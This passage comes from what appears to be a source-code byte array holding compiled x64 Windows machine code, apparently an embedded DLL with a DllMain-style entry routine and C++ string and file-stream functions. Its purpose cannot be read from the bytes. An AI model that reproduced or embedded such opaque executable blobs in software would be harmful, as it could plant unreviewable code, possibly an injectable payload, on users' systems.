0x00, 0xFF, 0x15, 0x4F, 0x35, 0x00,	0x00, 0x85, 0xC0, 0x0F, 0x84, 0xD7, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x45,	0xA0, 0x48, 0x89, 0x44, 0x24, 0x20, 0x41, 0xB9, 0x2C, 0x01, 0x00, 0x00,	0x4C, 0x8D, 0x85, 0x70, 0x02, 0x00, 0x00, 0xBA, 0x01, 0x00, 0x00, 0x00,	0x48, 0x8B, 0x4D, 0x80, 0xFF, 0x15, 0x1A, 0x35, 0x00, 0x00, 0x85, 0xC0,	0x0F, 0x84, 0xAA, 0x00, 0x00, 0x00, 0xC7, 0x45, 0xA4, 0x2C, 0x01, 0x00,	0x00, 0xC7, 0x45, 0xA0, 0x2C, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x45, 0x08,	0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8D, 0x45, 0xA4, 0x48, 0x89, 0x44,	0x24, 0x28, 0x48, 0x8D, 0x85, 0xA0, 0x03, 0x00, 0x00, 0x48, 0x89, 0x44,	0x24, 0x20, 0x4C, 0x8D, 0x4D, 0xA0, 0x4C, 0x8D, 0x85, 0x40, 0x01, 0x00,	0x00, 0x48, 0x8B, 0x95, 0x70, 0x02, 0x00, 0x00, 0x33, 0xC9, 0xFF, 0x15,	0xDC, 0x34, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x60, 0xBA, 0x2C, 0x01, 0x00,	0x00, 0x48, 0x8D, 0x0D, 0x9C, 0x6D, 0x00, 0x00, 0x83, 0x7D, 0xA4, 0x00,	0x74, 0x41, 0x4C, 0x8D, 0x85, 0xA0, 0x03, 0x00, 0x00, 0xFF, 0x15, 0xD1,	0x37, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x2A, 0x39, 0x00, 0x00, 0xBA, 0x2C,	0x01, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x76, 0x6D, 0x00, 0x00, 0xFF, 0x15,	0xC0, 0x37, 0x00, 0x00, 0x4C, 0x8D, 0x85, 0x40, 0x01, 0x00, 0x00, 0xBA,	0x2C, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x5D, 0x6D, 0x00, 0x00, 0xFF,	0x15, 0xA7, 0x37, 0x00, 0x00, 0xEB, 0x0D, 0x4C, 0x8D, 0x85, 0x40, 0x01,	0x00, 0x00, 0xFF, 0x15, 0x90, 0x37, 0x00, 0x00, 0x48, 0x8B, 0x4D, 0x80,	0x48, 0x85, 0xC9, 0x74, 0x06, 0xFF, 0x15, 0x79, 0x34, 0x00, 0x00, 0x4C,	0x89, 0x74, 0x24, 0x70, 0x48, 0xC7, 0x44, 0x24, 0x78, 0x0F, 0x00, 0x00,	0x00, 0xC6, 0x44, 0x24, 0x60, 0x00, 0x48, 0x8D, 0x85, 0x40, 0x01, 0x00,	0x00, 0x48, 0xFF, 0xC7, 0x80, 0x3C, 0x38, 0x00, 0x75, 0xF7, 0x4C, 0x8B,	0xC7, 0x48, 0x8D, 0x95, 0x40, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24,	0x60, 0xE8, 0xD2, 0x13, 0x00, 0x00, 0x90, 0x41, 0xB9, 0x0D, 0x00, 0x00,	0x00, 0x4C, 0x8D, 0x05, 0x24, 0x39, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24,	0x60, 0xE8, 0xDA, 0x1B, 0x00, 0x00, 0x4C, 0x89, 0x74, 0x24, 0x50, 0x4C,	0x89, 0x74, 0x24, 0x58, 0x0F, 0x10, 0x00, 0x0F, 0x11, 0x44, 0x24, 0x40,	0x0F, 0x10, 0x48, 0x10, 0x0F, 0x11, 0x4C, 0x24, 0x50, 0x4C, 0x89, 0x70,	0x10, 0x48, 0xC7, 0x40, 0x18, 0x0F, 0x00, 0x00, 0x00, 0xC6, 0x00, 0x00,	0x41, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xC7, 0x38, 0x00,	0x00, 0x48, 0x8D, 0x4C, 0x24, 0x40, 0xE8, 0xD9, 0x14, 0x00, 0x00, 0x4C,	0x89, 0xB5, 0x30, 0x01, 0x00, 0x00, 0x4C, 0x89, 0xB5, 0x38, 0x01, 0x00,	0x00, 0x0F, 0x10, 0x00, 0x0F, 0x11, 0x85, 0x20, 0x01, 0x00, 0x00, 0x0F,	0x10, 0x48, 0x10, 0x0F, 0x11, 0x8D, 0x30, 0x01, 0x00, 0x00, 0x4C, 0x89,	0x70, 0x10, 0x48, 0xC7, 0x40, 0x18, 0x0F, 0x00, 0x00, 0x00, 0xC6, 0x00,	0x00, 0x48, 0x8D, 0x95, 0x20, 0x01, 0x00, 0x00, 0x48, 0x83, 0xBD, 0x38,	0x01, 0x00, 0x00, 0x10, 0x48, 0x0F, 0x43, 0x95, 0x20, 0x01, 0x00, 0x00,	0x4C, 0x8B, 0x85, 0x30, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0x10, 0xE8,	0x30, 0x1C, 0x00, 0x00, 0x90, 0x48, 0x8B, 0x95, 0x38, 0x01, 0x00, 0x00,	0x48, 0x83, 0xFA, 0x10, 0x72, 0x37, 0x48, 0xFF, 0xC2, 0x48, 0x8B, 0x8D,	0x20, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xC1, 0x48, 0x81, 0xFA, 0x00, 0x10,	0x00, 0x00, 0x72, 0x1C, 0x48, 0x83, 0xC2, 0x27, 0x48, 0x8B, 0x49, 0xF8,	0x48, 0x2B, 0xC1, 0x48, 0x83, 0xC0, 0xF8, 0x48, 0x83, 0xF8, 0x1F, 0x76,	0x07, 0xFF, 0x15, 0xC9, 0x35, 0x00, 0x00, 0xCC, 0xE8, 0xAF, 0x1F, 0x00,	0x00, 0x4C, 0x89, 0xB5, 0x30, 0x01, 0x00, 0x00, 0x48, 0xC7, 0x85, 0x38,	0x01, 0x00, 0x00, 0x0F, 0x00, 0x00, 0x00, 0xC6, 0x85, 0x20, 0x01, 0x00,	0x00, 0x00, 0x48, 0x8B, 0x54, 0x24, 0x58, 0x48, 0x83, 0xFA, 0x10, 0x72,	0x35, 0x48, 0xFF, 0xC2, 0x48, 0x8B, 0x4C, 0x24, 0x40, 0x48, 0x8B, 0xC1,	0x48, 0x81, 0xFA, 0x00, 0x10, 0x00, 0x00, 0x72, 0x1C, 0x48, 0x83, 0xC2,	0x27, 0x48, 0x8B, 0x49, 0xF8, 0x48, 0x2B, 0xC1, 0x48, 0x83, 0xC0, 0xF8,	0x48, 0x83, 0xF8, 0x1F, 0x76, 0x07, 0xFF, 0x15, 0x70, 0x35, 0x00, 0x00,	0xCC, 0xE8, 0x56, 0x1F, 0x00, 0x00, 0x4C, 0x89, 0x74, 0x24, 0x50, 0x48,	0xC7, 0x44, 0x24, 0x58, 0x0F, 0x00, 0x00, 0x00, 0xC6, 0x44, 0x24, 0x40,	0x00, 0x48, 0x8B, 0x54, 0x24, 0x78, 0x48, 0x83, 0xFA, 0x10, 0x72, 0x35,	0x48, 0xFF, 0xC2, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x48, 0x8B, 0xC1, 0x48,	0x81, 0xFA, 0x00, 0x10, 0x00, 0x00, 0x72, 0x1C, 0x48, 0x83, 0xC2, 0x27,	0x48, 0x8B, 0x49, 0xF8, 0x48, 0x2B, 0xC1, 0x48, 0x83, 0xC0, 0xF8, 0x48,	0x83, 0xF8, 0x1F, 0x76, 0x07, 0xFF, 0x15, 0x1D, 0x35, 0x00, 0x00, 0xCC,	0xE8, 0x03, 0x1F, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0x10, 0xE8, 0x06, 0x14,	0x00, 0x00, 0x48, 0x8D, 0x4D, 0x18, 0xE8, 0x9D, 0x11, 0x00, 0x00, 0x48,	0x85, 0xC0, 0x75, 0x1D, 0x48, 0x8B, 0x45, 0x10, 0x48, 0x63, 0x48, 0x04,	0x48, 0x8D, 0x45, 0x10, 0x48, 0x03, 0xC8, 0x45, 0x33, 0xC0, 0x41, 0x8D,	0x50, 0x02, 0xFF, 0x15, 0x54, 0x33, 0x00, 0x00, 0x90, 0x48, 0x8B, 0x55,	0xE0, 0x48, 0x83, 0xFA, 0x10, 0x72, 0x35, 0x48, 0xFF, 0xC2, 0x48, 0x8B,	0x4D, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x81, 0xFA, 0x00, 0x10, 0x00, 0x00,	0x72, 0x1C, 0x48, 0x83, 0xC2, 0x27, 0x48, 0x8B, 0x49, 0xF8, 0x48, 0x2B,	0xC1, 0x48, 0x83, 0xC0, 0xF8, 0x48, 0x83, 0xF8, 0x1F, 0x76, 0x07, 0xFF,	0x15, 0xAB, 0x34, 0x00, 0x00, 0xCC, 0xE8, 0x91, 0x1E, 0x00, 0x00, 0x90,	0x48, 0x8B, 0x55, 0x00, 0x48, 0x83, 0xFA, 0x10, 0x72, 0x35, 0x48, 0xFF,	0xC2, 0x48, 0x8B, 0x4D, 0xE8, 0x48, 0x8B, 0xC1, 0x48, 0x81, 0xFA, 0x00,	0x10, 0x00, 0x00, 0x72, 0x1C, 0x48, 0x83, 0xC2, 0x27, 0x48, 0x8B, 0x49,	0xF8, 0x48, 0x2B, 0xC1, 0x48, 0x83, 0xC0, 0xF8, 0x48, 0x83, 0xF8, 0x1F,	0x76, 0x07, 0xFF, 0x15, 0x6C, 0x34, 0x00, 0x00, 0xCC, 0xE8, 0x52, 0x1E,	0x00, 0x00, 0x90, 0x48, 0x8B, 0x55, 0xC0, 0x48, 0x83, 0xFA, 0x10, 0x72,	0x34, 0x48, 0xFF, 0xC2, 0x48, 0x8B, 0x4D, 0xA8, 0x48, 0x8B, 0xC1, 0x48,	0x81, 0xFA, 0x00, 0x10, 0x00, 0x00, 0x72, 0x1C, 0x48, 0x83, 0xC2, 0x27,	0x48, 0x8B, 0x49, 0xF8, 0x48, 0x2B, 0xC1, 0x48, 0x83, 0xC0, 0xF8, 0x48,	0x83, 0xF8, 0x1F, 0x76, 0x07, 0xFF, 0x15, 0x2D, 0x34, 0x00, 0x00, 0xCC,	0xE8, 0x13, 0x1E, 0x00, 0x00, 0x4C, 0x89, 0x75, 0xB8, 0x48, 0xC7, 0x45,	0xC0, 0x0F, 0x00, 0x00, 0x00, 0xC6, 0x45, 0xA8, 0x00, 0x48, 0x8D, 0x4D,	0x10, 0xE8, 0x36, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x8D, 0xA0, 0x07, 0x00,	0x00, 0x48, 0x33, 0xCC, 0xE8, 0xC7, 0x1D, 0x00, 0x00, 0x4C, 0x8D, 0x9C,	0x24, 0xB0, 0x08, 0x00, 0x00, 0x49, 0x8B, 0x5B, 0x10, 0x49, 0x8B, 0x73,	0x18, 0x49, 0x8B, 0x7B, 0x20, 0x4D, 0x8B, 0x73, 0x28, 0x49, 0x8B, 0xE3,	0x5D, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,	0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8D,	0xB9, 0xA8, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x87, 0x58, 0xFF, 0xFF, 0xFF,	0x48, 0x63, 0x48, 0x04, 0x48, 0x8D, 0x05, 0xBD, 0x36, 0x00, 0x00, 0x48,	0x89, 0x84, 0x39, 0x58, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x87, 0x58, 0xFF,	0xFF, 0xFF, 0x48, 0x63, 0x48, 0x04, 0x8D, 0x91, 0x58, 0xFF, 0xFF, 0xFF,	0x89, 0x94, 0x39, 0x54, 0xFF, 0xFF, 0xFF, 0x48, 0x8D, 0x9F, 0x60, 0xFF,	0xFF, 0xFF, 0x48, 0x8D, 0x05, 0x9F, 0x36, 0x00, 0x00, 0x48, 0x89, 0x03,	0x48, 0x83, 0xBB, 0x80, 0x00, 0x00, 0x00, 0x00, 0x74, 0x2F, 0x48, 0x8B,	0x4B, 0x18, 0x48, 0x8D, 0x43, 0x70, 0x48, 0x39, 0x01, 0x75, 0x22, 0x4C,	0x8B, 0x83, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x93, 0x88, 0x00, 0x00,	0x00, 0x48, 0x89, 0x11, 0x48, 0x8B, 0x43, 0x38, 0x48, 0x89, 0x10, 0x44,	0x2B, 0xC2, 0x48, 0x8B, 0x43, 0x50, 0x44, 0x89, 0x00, 0x80, 0x7B, 0x7C,	0x00, 0x74, 0x08, 0x48, 0x8B, 0xCB, 0xE8, 0xD5, 0x0F, 0x00, 0x00, 0x48,	0x8B, 0xCB, 0xFF, 0x15, 0xBC, 0x31, 0x00, 0x00, 0x90, 0x48, 0x8D, 0x8F,	0x68, 0xFF, 0xFF, 0xFF, 0xFF, 0x15, 0xD6, 0x31, 0x00, 0x00, 0x48, 0x8B,	0xCF, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0x48,	0xFF, 0x25, 0xBA, 0x31, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x83, 0xFA, 0x01, 0x75,	0x05, 0xE8, 0x62, 0xF3, 0xFF, 0xFF, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48,	0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,	0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B,	0xD9, 0x48, 0x8B, 0xCA, 0xE8, 0x8B, 0x13, 0x00, 0x00, 0x48, 0x8B, 0xC8,	0x48, 0x8B, 0xF8, 0xFF, 0x15, 0x7F, 0x31, 0x00, 0x00, 0x84, 0xC0, 0x74,	0x13, 0x48, 0xC7, 0x43, 0x68, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x5C,	0x24, 0x30, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x48, 0x8B, 0xCB, 0x48,	0x89, 0x7B, 0x68, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x83, 0xC4, 0x20,	0x5F, 0x48, 0xFF, 0x25, 0xD8, 0x30, 0x00, 0x00, 0x40, 0x53, 0x48, 0x83,	0xEC, 0x20, 0x48, 0x83, 0xB9, 0x80, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B,	0xD9, 0x74, 0x2D, 0x4C, 0x8B, 0x01, 0xBA, 0xFF, 0xFF, 0xFF, 0xFF, 0x41,	0xFF, 0x50, 0x18, 0x83, 0xF8, 0xFF, 0x74, 0x1C, 0x48, 0x8B, 0x8B, 0x80,	0x00, 0x00, 0x00, 0xFF, 0x15, 0xBF, 0x32, 0x00, 0x00, 0x85, 0xC0, 0x79,	0x0B, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3,	0x33, 0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,	0xCC, 0xCC, 0xCC, 0xCC, 0x40, 0x53, 0x56, 0x48, 0x83, 0xEC, 0x48, 0x48,	0x8B, 0x05, 0xB2, 0x5F, 0x00, 0x00, 0x48, 0x33, 0xC4, 0x48, 0x89, 0x44,	0x24, 0x38, 0x33, 0xF6, 0x4D, 0x8B, 0xC8, 0x48, 0x8B, 0xD9, 0x48, 0x85,	0xD2, 0x75, 0x09, 0x4D, 0x85, 0xC0, 0x44, 0x8D, 0x46, 0x04, 0x74, 0x03,	0x44, 0x8B, 0xC6, 0x48, 0x8B, 0x89, 0x80, 0x00, 0x00, 0x00, 0x48, 0x85,	0xC9, 0x0F, 0x84, 0x9E, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x53, 0x32, 0x00,	0x00, 0x85, 0xC0, 0x0F, 0x85, 0x90, 0x00, 0x00, 0x00, 0x48, 0x89, 0x7C,	0x24, 0x40, 0x48, 0x8B, 0xCB, 0x48, 0x8B, 0xBB, 0x80, 0x00, 0x00, 0x00,	0xC6, 0x43, 0x7C, 0x01, 0x40, 0x88, 0x73, 0x71, 0xFF, 0x15, 0x1E, 0x30,	0x00, 0x00, 0x48, 0x85, 0xFF, 0x74, 0x4E, 0x4C, 0x8D, 0x4C, 0x24, 0x30,	0x48, 0x89, 0x74, 0x24, 0x20, 0x4C, 0x8D, 0x44, 0x24, 0x28, 0x48, 0x89,	0x74, 0x24, 0x28, 0x48, 0x8D, 0x54, 0x24, 0x20, 0x48, 0x89, 0x74, 0x24,	0x30, 0x48, 0x8B, 0xCF, 0xFF, 0x15, 0x2A, 0x32, 0x00, 0x00, 0x48, 0x8B,	0x4C, 0x24, 0x20, 0x48, 0x89, 0x4B, 0x18, 0x48, 0x89, 0x4B, 0x20, 0x48,	0x8B, 0x4C, 0x24, 0x28, 0x48, 0x89, 0x4B, 0x38, 0x48, 0x89, 0x4B, 0x40,	0x48, 0x8B, 0x4C, 0x24, 0x30, 0x48, 0x89, 0x4B, 0x50, 0x48, 0x89, 0x4B,	0x58, 0x48, 0x8B, 0x0D, 0xFC, 0x68, 0x00, 0x00, 0x48, 0x8B, 0xC3, 0x48,	0x89, 0xBB, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x7C, 0x24, 0x40, 0x48,	0x89, 0x4B, 0x74, 0x48, 0x89, 0x73, 0x68, 0xEB, 0x02, 0x33, 0xC0, 0x48,	0x8B, 0x4C, 0x24, 0x38, 0x48, 0x33, 0xCC, 0xE8, 0x24, 0x1B, 0x00, 0x00,	0x48, 0x83, 0xC4, 0x48, 0x5E, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x40, 0x53, 0x56, 0x57,	0x48, 0x83, 0xEC, 0x30, 0x48, 0x8B, 0x05, 0xB1, 0x5E, 0x00, 0x00, 0x48,	0x33, 0xC4, 0x48, 0x89, 0x44, 0x24, 0x28, 0x49, 0x8B, 0x40, 0x08, 0x49,	0x8B, 0xF0, 0x49, 0x03, 0x00, 0x48, 0x8B, 0xDA, 0x48, 0x83, 0xB9, 0x80,	0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xF9, 0x48, 0x89, 0x44, 0x24, 0x20,	0x74, 0x70, 0xE8, 0xB5, 0x0C, 0x00, 0x00, 0x84, 0xC0, 0x74, 0x67, 0x48,	0x8B, 0x8F, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x20, 0xFF,	0x15, 0x3F, 0x31, 0x00, 0x00, 0x85, 0xC0, 0x75, 0x51, 0x48, 0x8B, 0x4F,	0x18, 0x48, 0x8D, 0x47, 0x70, 0x48, 0x8B, 0x56, 0x10, 0x48, 0x89, 0x57,	0x74, 0x48, 0x39, 0x01, 0x75, 0x26, 0x48, 0x8B, 0x97, 0x88, 0x00, 0x00,	0x00, 0x4C, 0x8B, 0x87, 0x90, 0x00, 0x00, 0x00, 0x48, 0x89, 0x11, 0x44,	0x2B, 0xC2, 0x48, 0x8B, 0x4F, 0x38, 0x48, 0x89, 0x11, 0x48, 0x8B, 0x4F,	0x50, 0x44, 0x89, 0x01, 0x48, 0x8B, 0x57, 0x74, 0x48, 0x8B, 0x4C, 0x24,	0x20, 0x48, 0x89, 0x0B, 0x48, 0xC7, 0x43, 0x08, 0x00, 0x00, 0x00, 0x00,	0x48, 0x89, 0x53, 0x10, 0xEB, 0x15, 0x33, 0xC0, 0x48, 0xC7, 0x03, 0xFF,	0xFF, 0xFF, 0xFF, 0x48, 0xC7, 0x43, 0x08, 0x00, 0x00, 0x00, 0x00, 0x48,	0x89, 0x43, 0x10, 0x48, 0x8B, 0xC3, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x48,	0x33, 0xCC, 0xE8, 0x45, 0x1A, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x30, 0x5F,	0x5E, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,	0xCC, 0xCC, 0xCC, 0xCC, 0x40, 0x53, 0x55, 0x56, 0x57, 0x41, 0x56, 0x48,	0x83, 0xEC, 0x30, 0x48, 0x8B, 0x05, 0xCE, 0x5D, 0x00, 0x00, 0x48, 0x33,	0xC4, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8B, 0x41, 0x38, 0x4C, 0x8D,	0x71, 0x70, 0x41, 0x8B, 0xE9, 0x49, 0x8B, 0xF0, 0x48, 0x8B, 0xFA, 0x48,	0x8B, 0xD9, 0x4C, 0x39, 0x30, 0x75, 0x10, 0x41, 0x83, 0xF9, 0x01, 0x75,	0x0A, 0x48, 0x83, 0x79, 0x68, 0x00, 0x75, 0x03, 0x48, 0xFF, 0xCE, 0x48,	0x83, 0xB9, 0x80, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x84, 0x85, 0x00, 0x00,	0x00, 0xE8, 0xBA, 0x0B, 0x00, 0x00, 0x84, 0xC0, 0x74, 0x7C, 0x48, 0x85,	0xF6, 0x75, 0x05, 0x83, 0xFD, 0x01, 0x74, 0x17, 0x48, 0x8B, 0x8B, 0x80,	0x00, 0x00, 0x00, 0x44, 0x8B, 0xC5, 0x48, 0x8B, 0xD6, 0xFF, 0x15, 0x31,	0x30, 0x00, 0x00, 0x85, 0xC0, 0x75, 0x5B, 0x48, 0x8B, 0x8B, 0x80, 0x00,	0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x20, 0xFF, 0x15, 0x13, 0x30, 0x00,	0x00, 0x85, 0xC0, 0x75, 0x45, 0x48, 0x8B, 0x43, 0x18, 0x4C, 0x39, 0x30,	0x75, 0x22, 0x48, 0x8B, 0x93, 0x88, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x83,	0x90, 0x00, 0x00, 0x00, 0x48, 0x89, 0x10, 0x44, 0x2B, 0xC2, 0x48, 0x8B,	0x4B, 0x38, 0x48, 0x89, 0x11, 0x48, 0x8B, 0x4B, 0x50, 0x44, 0x89, 0x01,	0x48, 0x8B, 0x4B, 0x74, 0x48, 0x8B, 0x54, 0x24, 0x20, 0x48, 0x89, 0x17,	0x48, 0x89, 0x4F, 0x10, 0x48, 0xC7, 0x47, 0x08, 0x00, 0x00, 0x00, 0x00,	0xEB, 0x15, 0x33, 0xC0, 0x48, 0xC7, 0x07, 0xFF, 0xFF, 0xFF, 0xFF, 0x48,	0xC7, 0x47, 0x08, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0x47, 0x10, 0x48,	0x8B, 0xC7, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x48, 0x33, 0xCC, 0xE8, 0x35,	0x19, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5E, 0x5F, 0x5E, 0x5D,	0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,	0x48, 0x89, 0x5C, 0x24, 0x18, 0x48, 0x89, 0x7C, 0x24, 0x20, 0x41, 0x56,	0x48, 0x83, 0xEC, 0x20, 0x48, 0x83, 0x79, 0x68, 0x00, 0x49, 0x8B, 0xD8,	0x4C, 0x8B, 0xF2, 0x48, 0x8B, 0xF9, 0x74, 0x17, 0x48, 0x8B, 0x5C, 0x24,	0x40, 0x48, 0x8B, 0x7C, 0x24, 0x48, 0x48, 0x83, 0xC4, 0x20, 0x41, 0x5E,	0x48, 0xFF, 0x25, 0xC1, 0x2D, 0x00, 0x00, 0x48, 0x8B, 0x41, 0x40, 0x48,	0x89, 0x6C, 0x24, 0x30, 0x48, 0x89, 0x74, 0x24, 0x38, 0x48, 0x8B, 0xF3,	0x4C, 0x8B, 0x08, 0x4D, 0x85, 0xC9, 0x74, 0x08, 0x48, 0x8B, 0x41, 0x58,	0x8B, 0x08, 0xEB, 0x02, 0x33, 0xC9, 0x48, 0x63, 0xE9, 0x48, 0x85, 0xDB,	0x7E, 0x51, 0x85, 0xC9, 0x7E, 0x2D, 0x48, 0x3B, 0xDD, 0x49, 0x8B, 0xC9,	0x48, 0x0F, 0x4C, 0xEB, 0x4C, 0x8B, 0xC5, 0xE8, 0xE3, 0x27, 0x00, 0x00,	0x48, 0x8B, 0x47, 0x58, 0x48, 0x2B, 0xDD, 0x4C, 0x03, 0xF5, 0x29, 0x28,	0x48, 0x8B, 0x4F, 0x40, 0x48, 0x63, 0xC5, 0x48, 0x01, 0x01, 0x48, 0x85,	0xDB, 0x7E, 0x20, 0x4C, 0x8B, 0x8F, 0x80, 0x00, 0x00, 0x00, 0x4D, 0x85,	0xC9, 0x74, 0x14, 0x4C, 0x8B, 0xC3, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x49,	0x8B, 0xCE, 0xFF, 0x15, 0xD8, 0x2E, 0x00, 0x00, 0x48, 0x2B, 0xD8, 0x48,	0x8B, 0x6C, 0x24, 0x30, 0x48, 0x2B, 0xF3, 0x48, 0x8B, 0x5C, 0x24, 0x40,	0x48, 0x8B, 0xC6, 0x48, 0x8B, 0x74, 0x24, 0x38, 0x48, 0x8B, 0x7C, 0x24,	0x48, 0x48, 0x83, 0xC4, 0x20, 0x41, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x40, 0x55, 0x56, 0x41,	0x56, 0x48, 0x83, 0xEC, 0x30, 0x49, 0x8B, 0xE8, 0x4C, 0x8B, 0xF2, 0x48,	0x8B, 0xF1, 0x4D, 0x85, 0xC0, 0x7F, 0x0B, 0x33, 0xC0, 0x48, 0x83, 0xC4,	0x30, 0x41, 0x5E, 0x5E, 0x5D, 0xC3, 0x48, 0x83, 0x79, 0x68, 0x00, 0x74,	0x0F, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5E, 0x5E, 0x5D, 0x48, 0xFF, 0x25,	0xD8, 0x2C, 0x00, 0x00, 0x48, 0x8B, 0x41, 0x38, 0x48, 0x89, 0x5C, 0x24,	0x28, 0x48, 0x8B, 0xDD, 0x48, 0x8B, 0x10, 0x48, 0x85, 0xD2, 0x74, 0x08,	0x48, 0x8B, 0x41, 0x50, 0x8B, 0x08, 0xEB, 0x02, 0x33, 0xC9, 0x48, 0x89,	0x7C, 0x24, 0x20, 0x48, 0x63, 0xC1, 0x85, 0xC9, 0x74, 0x2E, 0x48, 0x3B,	0xC5, 0x48, 0x8B, 0xFD, 0x49, 0x8B, 0xCE, 0x48, 0x0F, 0x42, 0xF8, 0x4C,	0x8B, 0xC7, 0xE8, 0x04, 0x27, 0x00, 0x00, 0x48, 0x8B, 0x46, 0x50, 0x48,	0x2B, 0xDF, 0x4C, 0x03, 0xF7, 0x4C, 0x8B, 0xC3, 0x29, 0x38, 0x48, 0x8B,	0x4E, 0x38, 0x48, 0x63, 0xC7, 0x48, 0x01, 0x01, 0x48, 0x83, 0xBE, 0x80,	0x00, 0x00, 0x00, 0x00, 0x0F, 0x84, 0x99, 0x00, 0x00, 0x00, 0x4C, 0x8B,	0x4E, 0x18, 0x48, 0x8D, 0x46, 0x70, 0x49, 0x39, 0x01, 0x75, 0x20, 0x48,	0x8B, 0x8E, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x96, 0x90, 0x00, 0x00,	0x00, 0x49, 0x89, 0x09, 0x2B, 0xD1, 0x48, 0x8B, 0x46, 0x38, 0x48, 0x89,	0x08, 0x48, 0x8B, 0x46, 0x50, 0x89, 0x10, 0x49, 0x8B, 0xF8, 0x49, 0x81,	0xF8, 0xFF, 0x0F, 0x00, 0x00, 0x76, 0x3A, 0x66, 0x0F, 0x1F, 0x84, 0x00,	0x00, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x8E, 0x80, 0x00, 0x00, 0x00, 0xBA,	0x01, 0x00, 0x00, 0x00, 0x41, 0xB8, 0xFF, 0x0F, 0x00, 0x00, 0x49, 0x8B,	0xCE, 0xFF, 0x15, 0xA5, 0x2D, 0x00, 0x00, 0x48, 0x2B, 0xD8, 0x4C, 0x03,	0xF0, 0x48, 0x8B, 0xFB, 0x48, 0x3D, 0xFF, 0x0F, 0x00, 0x00, 0x75, 0x44,	0x48, 0x3B, 0xD8, 0x77, 0xCF, 0x4C, 0x8B, 0xC7, 0x48, 0x85, 0xFF, 0x74,	0x1E, 0x4C, 0x8B, 0x8E, 0x80, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xC3, 0xBA,	0x01, 0x00, 0x00, 0x00, 0x49, 0x8B, 0xCE, 0xFF, 0x15, 0x6F, 0x2D, 0x00,	0x00, 0x4C, 0x8B, 0xC7, 0x4C, 0x2B, 0xC0, 0x49, 0x2B, 0xE8, 0x48, 0x8B,	0x7C, 0x24, 0x20, 0x48, 0x8B, 0xC5, 0x48, 0x8B, 0x5C, 0x24, 0x28, 0x48,	0x83, 0xC4, 0x30, 0x41, 0x5E, 0x5E, 0x5D, 0xC3, 0x48, 0x2B, 0xEB, 0xEB,	0xE5, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,	0x48, 0x89, 0x5C, 0x24, 0x10, 0x48, 0x89, 0x7C, 0x24, 0x18, 0x55, 0x48,	0x8B, 0xEC, 0x48, 0x81, 0xEC, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8B, 